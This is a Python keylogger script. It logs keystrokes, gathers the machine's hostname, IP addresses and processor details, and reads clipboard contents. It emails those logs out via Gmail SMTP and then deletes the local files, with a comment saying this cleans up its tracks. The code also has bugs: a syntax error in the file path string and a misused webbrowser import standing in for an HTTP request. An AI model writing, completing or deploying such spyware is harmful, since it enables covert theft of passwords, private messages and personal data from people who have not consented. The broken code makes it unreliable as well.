# Libraries
#email
#multi-internet mail extention--- internet protocol allows mail to support audio image video and text  
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
import smtplib
#comp info
import socket
import platform
#get user Name
import getpass
from webbrowser import get
#clipboard
import win32clipboard
#keystrokes listener
from pynput.keyboard import Key, Listener
from pynput import keyboard


#creating file to store log and file path
keys_information ="key_log.txt"
file_path = "./logs/""
system_information="systeminfo.txt"
clipboard_information="clipboardinfo.txt"
#allows to add an extention to access keylog.txt file
extend ="\\"



#creating a keylogger
count = 0
keys=[]

def on_press(key):
    global keys,count 

    print(key)
    keys.append(key)
    count += 1
#add new keys to file
    if count >=1:
        count =0
        write_file(keys)
        keys=[]

#write on keylog file
def write_file(keys):
    with open(file_path+extend +keys_information,"a") as f:
        for key in keys:
            #readable file 
            k = str(key).replace("'","")
            if k.find("space")>0:
                f.write('\n')
                f.close()
            elif k.find ("key") == -1:
                f.write(k)
                f.close()
def on_release(key):
    if key == keyboard.Key.esc:
        return False
    
with Listener(on_press = on_press, on_release=on_release) as listener:
    listener.join()

#email
email_address="your_email@example.com"
password = "your_app_specific_password"
toaddr ="your_email@example.com"

def send_email(filename,attachment,toaddr):
    fromaddr= email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['subject'] = "kLog File"
    #body of mail
    body = "Boddy_of_the_mail"

    msg.attach(MIMEText(body,'plain'))

    filename = filename 
    attachment=open(attachment,"rb")

    p = MIMEBase('application','octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)
    p.add_header('Content-Disposition',"attachment; filename= %s" % filename)
    msg.attach(p)
    
    s = smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login(fromaddr,password)
    text = msg.as_string()
    s.sendmail(fromaddr,toaddr,text)
    s.quit()
send_email(keys_information,file_path+extend+keys_information,toaddr)

# Get Computer and Network Information
def computer_information():
    with open(file_path + extend+ system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip= get("https://api.ipify.org").text
            f.write("public IP Address: "+ public_ip)
        except Exception:
            f.write("couldn't get public ip")
        
        f.write("Processor: " + (platform.processor() + "\n"))
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()
send_email(system_information, file_path + extend + system_information,toaddr)

# Gather clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied.")

copy_clipboard()
send_email(clipboard_information, file_path + extend + clipboard_information,toaddr)

# Delete files - clean up our tracks
delete_files = [system_information, clipboard_information, keys_information]
for file in delete_files:
    os.remove(file_path + extend + file)
